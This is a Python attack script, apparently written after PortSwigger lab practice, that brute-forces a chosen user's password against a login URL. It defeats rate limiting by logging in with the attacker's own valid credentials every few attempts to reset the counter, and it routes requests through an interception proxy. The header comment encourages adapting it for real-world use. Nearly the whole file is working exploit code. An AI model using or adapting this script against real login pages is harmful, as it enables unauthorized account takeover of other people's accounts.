
## THE TESTING WAS PERFORMED ON PORTSWIGGER LABS ##
# To make it work in real life scenerions modify it😝

import requests
import argparse
import sys
import urllib3

# Suppress "InsecureRequestWarning" for a cleaner terminal when using verify=False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pwn_login():
    parser = argparse.ArgumentParser(description="Bypass Rate-Limiting via Session Reset (Proxy Enabled)")
    parser.add_argument("-u", "--url", required=True, help="Target Login URL")
    parser.add_argument("-t", "--target", required=True, help="Username to brute-force")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("-mu", "--myuser", required=True, help="Your valid username")
    parser.add_argument("-mp", "--mypass", required=True, help="Your valid password")
    parser.add_argument("-n", "--threshold", type=int, default=3, help="Attempts before reset (default: 3)")
    parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default: Burp/Caido)")
    
    args = parser.parse_args()

    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }

    session = requests.Session()
    
    # Apply proxy to the session so we don't have to define it every time
    session.proxies.update(proxies)
    session.verify = False  # Critical for Burp/Caido to work without SSL errors

    try:
        with open(args.wordlist, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Wordlist {args.wordlist} not found.")
        sys.exit(1)

    print(f"[*] Starting attack. Traffic is being routed through {args.proxy}...")
    
    count = 0
    for password in passwords:
        print(f"[#] Trying {args.target}:{password}")
        data = {"username": args.target, "password": password}
        
        try:
            res = session.post(args.url, data=data, allow_redirects=False)

            if res.status_code == 302:
                print(f"\n[!] SUCCESS! Password for {args.target} is: {password}")
                return

            count += 1

          
            if count == (args.threshold - 1):
                print(f"[*] Threshold reached. Resetting counter via {args.myuser}...")
                reset_data = {"username": args.myuser, "password": args.mypass}
                session.post(args.url, data=reset_data, allow_redirects=False)
                count = 0 
                
        except requests.exceptions.ProxyError:
            print("[-] Error: Could not connect to the proxy. Is Burp/Caido running?")
            return

    print("[-] Brute force finished. Check your proxy for details.")

if __name__ == "__main__":
    pwn_login()
